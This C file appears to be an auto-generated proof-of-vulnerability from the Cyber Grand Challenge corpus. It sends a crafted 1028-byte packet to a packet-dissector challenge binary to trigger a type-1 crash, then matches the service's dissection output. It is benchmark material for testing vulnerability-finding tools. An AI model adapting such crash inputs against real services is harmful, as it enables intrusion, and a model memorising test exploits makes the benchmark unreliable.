#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xb9\xe8\x03\x41"
         "\x7a\xc1\xa8\x4f\xa8\x78\x71\x04\x25\x00\x00\x00\xf3\x7d\x11\xa2"
         "\x38\x70\x78\x96\xd3\x02\x19\xd2\x55\x38\x86\xf3\x32\xcb\xaf\x27"
         "\x80\x8d\xdd\x5c\xf4\x66\x09\x34\x69\x4a\x49\xbb\xa8\x74\xe4\x38"
         "\x68\x8b\x37\xb7\x7b\x19\xd0\x96\x37\xab\x61\xa0\x13\xff\x9f\x39"
         "\x89\x00\x29\x03\x06\xbf\xc8\xb3\x3d\x9a\x3b\x14\xd8\xb1\xb7\x63"
         "\xdc\x2a\xbb\x10\x73\xc4\x1b\x9c\xcf\x13\xc4\xeb\xae\x2f\xfd\xdc"
         "\x2d\xeb\x76\xa8\xcf\xb4\x23\xf6\x46\xf9\x47\x14\x31\x3d\x62\xf3"
         "\xf9\x58\x49\x28\x92\x00\xf5\x8f\x72\xb1\xa5\x19\x99\x20\xc5\x4b"
         "\xda\x98\x37\xb7\x81\xf1\x52\xdb\x4b\x6d\xae\xa1\x63\x0e\xd0\xa2"
         "\x68\xa2\x6f\xca\xe6\x7e\x92\xd1\xad\x04\x24\x47\x41\x99\x27\x94"
         "\x09\x1e\x84\xd6\x22\x90\x74\x5b\x72\xe1\x5d\x35\x68\x98\xd7\x4a"
         "\x31\x4f\xee\x0a\xd2\x1b\xf9\x98\xbc\xad\xf0\x0e\x26\xbc\xfb\x7a"
         "\x3e\x9b\x92\xf4\x08\x43\x68\x40\x43\xee\x33\xa8\xc2\xb2\x99\x8b"
         "\x7d\xc3\xa4\xdb\x6c\x29\xd4\xc3\x8a\xd9\x10\xa0\x60\x8f\xd8\xd5"
         "\x56\x31\xa1\x59\x5c\x1c\x3d\xca\x67\x9b\xee\xc6\x29\xcc\x9b\x7e"
         "\x7a\x86\xf5\x2f\x82\xd6\x43\x87\xca\x5c\x17\xc2\x99\x1d\xb0\xe9"
         "\x95\x6c\xed\x0d\x9d\x0e\xdd\x5b\xd0\x3f\x17\xbd\x91\xe1\x7f\xa2"
         "\xf1\xf2\x2a\x08\x5c\xc2\x49\xa7\xbb\x1d\x3a\x7a\x62\xa8\x76\x86"
         "\xf6\x7f\xdd\x94\x9d\x65\xc9\x78\xca\xf0\x40\x1c\xd8\x2e\x45\x28"
         "\x27\x5f\x7f\x3d\xa2\x09\x75\x73\xdb\x26\x04\x17\x6e\x28\xbd\x08"
         "\x1b\x03\x1d\x9f\x52\xa2\xf0\x35\xfc\x9f\x26\x49\xa7\x84\x30\x9a"
         "\xcb\x9b\x33\xd4\x1b\x45\xe8\x3d\x68\x8b\x5c\xba\x93\x83\x6e\xc9"
         "\x93\xf5\x83\x97\xb8\xdd\xb3\xff\x51\x17\x4d\xf3\x47\xfb\x9c\x4d"
         "\x67\x64\xff\xd9\xd9\x41\x20\x14\xc8\xb4\xb7\x23\xbb\xc7\xa3\xa7"
         "\x71\x4b\x15\xdc\x83\x00\x75\x0f\x9d\xcf\x69\xc2\xc0\xa0\xe8\x76"
         "\xa5\x83\xf0\xb5\x77\xe9\xf4\x87\xd8\xba\x28\x18\x38\x8c\xa2\x72"
         "\x34\x7e\x91\x0d\xe7\xa2\x8b\xb9\x9f\xf1\x23\xb3\x85\x62\xdd\xa9"
         "\x4f\xe1\x99\x67\x8c\xbf\x68\x1e\x84\xc1\x70\x92\xd6\xc8\x92\x5b"
         "\xd6\xcd\x59\x8b\x9e\xd3\xe9\x39\xeb\x08\xaf\xcd\x5b\x88\x4f\x36"
         "\x06\x13\x3c\x1b\x69\xcf\x9f\x75\x91\x31\x00\xbc\x85\x92\xd7\xbb"
         "\xb4\x31\x00\x27\x9d\x1b\x37\x07\x6f\x8d\x55\x88\x5c\xc7\x8b\xc7"
         "\x89\x31\x31\x00\x07\xe3\x4f\x42\x61\x4e\x26\xed\xde\x77\x25\x26"
         "\x73\xd1\xcb\xdf\xab\x92\xb2\x88\x25\x7f\x2e\x78\x15\x08\x11\xb3"
         "\xa1\x29\x31\x5e\xa5\xfc\x9e\x81\x46\x17\x15\x26\x3a\xc3\xe1\x31"
         "\x84\x27\x9f\x67\xbc\x8c\x2c\x1b\x3d\x63\x11\xa1\x64\x63\x4e\x10"
         "\x54\x12\x0d\x25\x2e\xdb\x62\x3c\xbc\x1d\x6f\xc2\x4c\xc6\x07\xd7"
         "\x41\x39\xc6\xe5\x70\x22\x79\xad\x7b\xb2\x06\xf8\x40\x13\x6b\xcc"
         "\xfa\xb3\x31\xf7\xe8\x18\xad\xb3\xda\xa3\x28\xe3\xa2\x07\xdf\xfe"
         "\xa2\x13\xab\x89\xdd\x7d\xf9\x49\x1e\x38\x94\x97\x69\x22\x22\x70"
         "\xf9\x7a\xd6\x65\x76\xbb\xff\x4d\xff\x83\x67\x7b\x0e\x12\xef\xb9"
         "\x17\x05\x03\x4a\x02\x49\x95\xf4\x80\x6c\xd2\x15\x21\xb7\xb6\x77"
         "\xff\xbd\xde\x10\x45\x7b\x02\x0b\xd0\x3d\x24\xbb\xec\x76\x8c\x1c"
         "\xa4\x6a\x71\xf2\xd7\xd9\x96\xe4\x21\xda\x1c\x51\x70\xdb\x1e\x3a"
         "\xb6\x01\x9c\x5c\xf9\x53\x61\xc3\xdc\x3f\x96\x36\x71\x74\x48\x35"
         "\x3f\x85\x05\x29\xb7\xc9\xa9\x3e\x91\x57\x39\x2d\x05\xd5\x3f\xb5"
         "\xe6\x01\xb8\x79\x9b\xbf\x23\x67\x22\xd3\xeb\x0b\xee\x46\x41\x58"
         "\xc1\x52\x0e\xab\x8f\x0c\x6e\x2d\xed\x89\xaa\x01\xec\x2b\x16\x9f"
         "\xd6\x47\x8c\xc5\x61\x31\x00\x31\xbf\x7f\x6f\xe6\xd2\x78\x91\x76"
         "\xa1\x03\x88\xbd\xce\x20\x79\xfe\xcd\x73\x31\x29\xe5\x4c\xc9\x20"
         "\xc7\xf4\xb5\x46\xd7\x45\xca\x13\x59\x39\xe7\x4d\xc8\xf5\xfd\x36"
         "\x8b\xb0\x6a\xa8\x3c\x67\xbe\x35\xc4\xa0\x89\x98\xd7\xd5\x0c\x1a"
         "\x7c\x1f\x58\x6a\x6a\x85\xa3\x25\xed\xa9\x74\x92\xb9\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===noninfectionvenerativeness
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6e\x6f\x6e\x69\x6e\x66\x65\x63\x74\x69\x6f"
         "\x6e\x76\x65\x6e\x65\x72\x61\x74\x69\x76\x65\x6e\x65\x73\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
